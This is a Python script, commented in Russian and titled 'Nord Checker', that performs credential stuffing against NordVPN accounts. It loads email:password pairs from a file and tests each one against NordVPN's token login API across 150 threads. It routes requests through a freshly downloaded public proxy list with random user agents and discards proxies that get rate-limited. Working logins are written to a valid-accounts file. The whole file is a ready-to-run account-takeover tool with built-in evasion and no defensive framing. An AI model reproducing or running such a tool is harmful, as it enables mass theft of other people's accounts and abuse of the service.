#!/usr/bin/python
# -*- coding: utf-8 -*-

import os
import random
import urllib.request
from concurrent.futures import ThreadPoolExecutor

import requests
from art import tprint
from fake_useragent import UserAgent
from loguru import logger

# Генерируем фейковый UserAgent
ua = UserAgent()

# Выставляем количесвто потоков и инициализируем переменную
pool = ThreadPoolExecutor(max_workers=150)

# Обновляем прокси с ссылки
url = 'https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt'
urllib.request.urlretrieve(url, 'proxies.txt')

# Генерируем файл лога с ротацией в 10 дней
logger.add("log.log", retention="10 days")


# Создаем класс с переменными
class NordChecker:
    def __init__(self):
        self.proxies = []
        self.accounts = []
        self.valid = 0
        self.invalid = 0
        self.banned = 0

    # Создаем функцию чекера аккаунтов
    def check_account(self, email, password):
        try:
            proxy = self.get_proxy()
            acc_data = {
                "username": email,
                "password": password
            }
            login = requests.post("https://api.nordvpn.com/v1/users/tokens", json=acc_data, proxies=proxy)
            if "user_id" in login.text:
                self.valid += 1
                if os.name == 'nt':
                    os.system(f"title Nord Checker - Valid: {self.valid} - Bad: {self.invalid} - Banned: {self.banned}")
                # Сохраняем аккаунты
                with open("checked/valid.txt", "ap") as f:
                    f.write("%s:%s\n" % (email, password))
                logger.success('Valid Account - %s:%s' % (email, password))
                return
            elif login.status_code == 429:
                logger.warning("Banned Proxy - %s:%s" % (email, password))
                self.banned += 1
                if os.name == 'nt':
                    os.system(f"title Nord Checker - Valid: {self.valid} - Bad: {self.invalid} - Banned: {self.banned}")
                # Удаляем забанненный прокси
                self.proxies.remove(proxy)
                return
            self.invalid += 1
            if os.name == 'nt':
                os.system(f"title Nord Checker - Valid: {self.valid} - Bad: {self.invalid} - Banned: {self.banned}")

            logger.warning("Invalid Account - %s:%s" % (email, password))
        except Exception as e:
            print(e)

    # Запускаем настройку: читаем файлы с аккаунтами и прокси
    @logger.catch  # Запускаем отработчик ошибок
    def setup(self):
        with open("accounts.txt") as acc_list:
            for acc in acc_list.read().split("\n"):
                self.accounts.append(acc)
        with open("proxies.txt") as proxy_list:
            for proxy in proxy_list.read().split("\n"):
                self.proxies.append(proxy)
        proxy_count = len(self.proxies)
        acc_count = len(self.accounts)
        if os.name == 'nt':
            os.system(f"title Nord Checker - Accounts: {acc_count} - Proxies: {proxy_count}")
        logger.info(f"Starting NordChecker, loaded {acc_count} accounts and {proxy_count} proxies...")


    @logger.catch  # Запускаем отработчик ошибок
    def run(self):
        for acc in self.accounts:
            try:
                email = acc.split(":")[0]
                password = acc.split(":")[1]
                pool.submit(self.check_account, email, password)
            except Exception as e:
                logger.critical(f"An Error Occurred: {e}")

    # Проверяем прокси
    def get_proxy(self):
        while True:
            try:
                proxy = {"https": f"https://{random.choice(self.proxies)}"}
                ret = requests.get("https://nordvpn.com/",
                                   proxies=proxy,
                                   timeout=7.5,
                                   headers={"user-agent": f"{ua.random}"})
                return proxy
            except Exception:
                pass


# Запускаем скрипт если он является главным
if __name__ == "__main__":
    nc = NordChecker()
    os.system('cls' if os.name == 'nt' else 'clear')
    if os.name == 'nt':
        os.system('title Nord Checker - By: httpshotmaker')
    tprint('Nord Checker')
    nc.setup()
    nc.run()